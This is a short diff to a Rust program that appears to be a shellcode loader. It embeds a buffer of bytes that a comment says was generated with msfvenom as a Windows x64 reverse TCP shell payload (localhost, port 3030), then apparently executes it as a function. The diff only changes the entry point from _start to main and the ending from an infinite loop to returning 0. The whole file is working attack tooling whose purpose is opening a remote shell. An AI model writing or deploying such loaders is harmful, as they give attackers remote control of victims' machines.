@@ -9,7 +9,8 @@ use windows_sys::Win32::System::Memory::{
 };
 
 #[no_mangle]
-pub extern "C" fn _start() -> ! {
+fn main() -> u8 {
+    
     // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3030 -f rust
     let buf: [u8; 460] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -68,7 +69,7 @@ pub extern "C" fn _start() -> ! {
         func()
     }
 
-    loop {}
+    0
 }
 
 #[cfg(not(test))]
